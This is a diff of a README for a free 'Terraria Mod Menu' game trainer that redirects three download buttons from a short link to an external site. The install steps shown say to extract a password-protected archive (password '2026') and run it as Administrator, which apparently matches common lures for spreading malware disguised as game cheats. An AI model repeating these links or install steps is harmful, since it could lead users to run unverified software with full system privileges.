@@ -9,7 +9,7 @@ The **⛏️ Terraria Mod Menu** is a **free** trainer for Terraria that gives y
 
 <div align="center">
 
-[![Download Terraria Mod Menu](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/terraria-mod-menu)
+[![Download Terraria Mod Menu](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/terraria-mod-menu)
 
 </div>
 
@@ -110,7 +110,7 @@ Terraria has thousands of items and endless possibilities — but grinding for r
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Launch Terraria → Press `INSERT` for menu
 
-[![Download Terraria Mod Menu](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/terraria-mod-menu)
+[![Download Terraria Mod Menu](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/terraria-mod-menu)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -260,7 +260,7 @@ Build, explore, and test anything in Terraria for free. **Terraria Mod Menu** gi
 
 <div align="center">
 
-[![Download Terraria Mod Menu](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/terraria-mod-menu)
+[![Download Terraria Mod Menu](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/terraria-mod-menu)
 
 **Version 4.6.1** — Free Terraria trainer. April 2026 update. Zero cost. No payment.
 
